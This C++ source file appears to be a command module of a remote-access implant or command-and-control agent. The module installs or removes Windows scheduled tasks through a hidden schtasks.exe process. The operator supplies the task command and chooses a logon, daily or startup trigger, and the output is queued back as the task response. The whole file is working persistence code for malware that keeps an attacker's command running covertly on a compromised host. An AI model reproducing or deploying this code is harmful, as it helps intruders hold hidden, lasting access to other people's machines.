#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PERSIST_SCHTASK

using namespace stardust;
using namespace starburst;

struct SchtaskJobCtx {
    instance* inst;
    char      task_uuid[37];
    HANDLE    h_read;
    HANDLE    h_process;
};

static auto WINAPI declfn schtask_thread_fn( LPVOID param ) -> DWORD {
    auto ctx  = static_cast<SchtaskJobCtx*>( param );
    auto& inst = *ctx->inst;

    inst.kernel32.WaitForSingleObject( ctx->h_process, 30000 );
    inst.kernel32.TerminateProcess( ctx->h_process, 0 );
    inst.kernel32.CloseHandle( ctx->h_process );

    uint8_t* output = nullptr;
    uint32_t out_len = 0;
    uint32_t out_cap = 0;

    DWORD bytes_read = 0;
    uint8_t read_buf[4096];

    while ( true ) {
        bytes_read = 0;
        BOOL read_ok = inst.kernel32.ReadFile(
            ctx->h_read, read_buf, sizeof(read_buf), &bytes_read, nullptr );
        if ( !read_ok || bytes_read == 0 ) break;

        if ( out_len + bytes_read > out_cap ) {
            uint32_t new_cap = out_cap == 0 ? 4096 : out_cap;
            while ( new_cap < out_len + bytes_read + 1 ) new_cap *= 2;
            output = static_cast<uint8_t*>( inst.heap_realloc( output, new_cap ) );
            out_cap = new_cap;
        }

        memory::copy( output + out_len, read_buf, bytes_read );
        out_len += bytes_read;
    }

    inst.kernel32.CloseHandle( ctx->h_read );

    if ( output ) {
        output[out_len] = '\0';
        queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
            reinterpret_cast<char*>( output ) );
        inst.heap_free( output );
    } else {
        queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "" ) ) );
    }

    inst.heap_free( ctx );
    return 0;
}

auto declfn starburst::cmd_persist_schtask(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action_str = parser_string( params, &action_len );
    uint32_t name_len = 0;
    auto name_str = parser_string( params, &name_len );
    uint32_t command_len = 0;
    auto command_str = parser_string( params, &command_len );
    uint32_t trigger_len = 0;
    auto trigger_str = parser_string( params, &trigger_len );

    if ( !action_str || action_len == 0 || !name_str || name_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need action and name" ) ) );
        return;
    }

    char action_buf[16] = { 0 };
    memory::copy( action_buf, action_str, action_len < 15 ? action_len : 15 );
    char name_buf[256] = { 0 };
    memory::copy( name_buf, name_str, name_len < 255 ? name_len : 255 );
    char command_buf[512] = { 0 };
    if ( command_str && command_len > 0 )
        memory::copy( command_buf, command_str, command_len < 511 ? command_len : 511 );
    char trigger_buf[16] = { 0 };
    if ( trigger_str && trigger_len > 0 )
        memory::copy( trigger_buf, trigger_str, trigger_len < 15 ? trigger_len : 15 );

    bool is_install = str_cmp( action_buf,
        symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;

    // Build command line for schtasks.exe
    char cmdline[2048] = { 0 };

    if ( is_install ) {
        if ( !command_str || command_len == 0 || !trigger_str || trigger_len == 0 ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "install requires command and trigger" ) ) );
            return;
        }

        // Map trigger string to schtasks /SC value
        char sc_val[16] = { 0 };
        if ( str_cmp( trigger_buf, symbol<char*>( const_cast<char*>( "logon" ) ) ) == 0 ) {
            str_copy( sc_val, symbol<char*>( const_cast<char*>( "ONLOGON" ) ) );
        } else if ( str_cmp( trigger_buf, symbol<char*>( const_cast<char*>( "daily" ) ) ) == 0 ) {
            str_copy( sc_val, symbol<char*>( const_cast<char*>( "DAILY" ) ) );
        } else if ( str_cmp( trigger_buf, symbol<char*>( const_cast<char*>( "startup" ) ) ) == 0 ) {
            str_copy( sc_val, symbol<char*>( const_cast<char*>( "ONSTART" ) ) );
        } else {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "invalid trigger: use logon, daily, or startup" ) ) );
            return;
        }

        // schtasks.exe /Create /TN "<name>" /TR "<command>" /SC <trigger> /F
        uint32_t off = 0;
        str_copy( cmdline + off, symbol<char*>( const_cast<char*>(
            "schtasks.exe /Create /TN \"" ) ) );
        off = str_len( cmdline );
        memory::copy( cmdline + off, name_buf, str_len( name_buf ) );
        off += str_len( name_buf );
        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( "\" /TR \"" ) ) );
        off = str_len( cmdline );
        memory::copy( cmdline + off, command_buf, str_len( command_buf ) );
        off += str_len( command_buf );
        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( "\" /SC " ) ) );
        off = str_len( cmdline );
        memory::copy( cmdline + off, sc_val, str_len( sc_val ) );
        off += str_len( sc_val );
        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( " /F" ) ) );
    } else {
        // schtasks.exe /Delete /TN "<name>" /F
        uint32_t off = 0;
        str_copy( cmdline + off, symbol<char*>( const_cast<char*>(
            "schtasks.exe /Delete /TN \"" ) ) );
        off = str_len( cmdline );
        memory::copy( cmdline + off, name_buf, str_len( name_buf ) );
        off += str_len( name_buf );
        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( "\" /F" ) ) );
    }

    // Convert to wide for CreateProcessW
    wchar_t wcmdline[2048] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline, -1, wcmdline, 2048 );

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength        = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle = TRUE;

    HANDLE h_read  = nullptr;
    HANDLE h_write = nullptr;

    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
        return;
    }

    STARTUPINFOW si = {};
    si.cb          = sizeof( STARTUPINFOW );
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = h_write;
    si.hStdError   = h_write;

    PROCESS_INFORMATION pi = {};

    BOOL ok = inst.kernel32.CreateProcessW(
        nullptr, wcmdline,
        nullptr, nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi
    );

    inst.kernel32.CloseHandle( h_write );

    if ( !ok ) {
        inst.kernel32.CloseHandle( h_read );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( pi.hThread );

    auto ctx = static_cast<SchtaskJobCtx*>( inst.heap_alloc( sizeof(SchtaskJobCtx) ) );
    if ( !ctx ) {
        inst.kernel32.TerminateProcess( pi.hProcess, 0 );
        inst.kernel32.CloseHandle( pi.hProcess );
        inst.kernel32.CloseHandle( h_read );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    ctx->inst      = &inst;
    ctx->h_read    = h_read;
    ctx->h_process = pi.hProcess;
    memory::copy( ctx->task_uuid, task_uuid, 36 );
    ctx->task_uuid[36] = '\0';

    HANDLE h_thread = inst.kernel32.CreateThread(
        nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>( schtask_thread_fn ),
        ctx, 0, nullptr );

    if ( !h_thread ) {
        inst.kernel32.TerminateProcess( pi.hProcess, 0 );
        inst.kernel32.CloseHandle( pi.hProcess );
        inst.kernel32.CloseHandle( h_read );
        inst.heap_free( ctx );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
        return;
    }

    if ( inst.jobs.count < instance::MAX_JOBS ) {
        auto& job = inst.jobs.entries[inst.jobs.count++];
        memory::copy( job.task_uuid, ctx->task_uuid, 37 );
        job.cmd_id   = CMD_PERSIST_SCHTASK;
        job.h_thread = h_thread;
        job.active   = true;
    } else {
        inst.kernel32.CloseHandle( h_thread );
    }
}

#endif
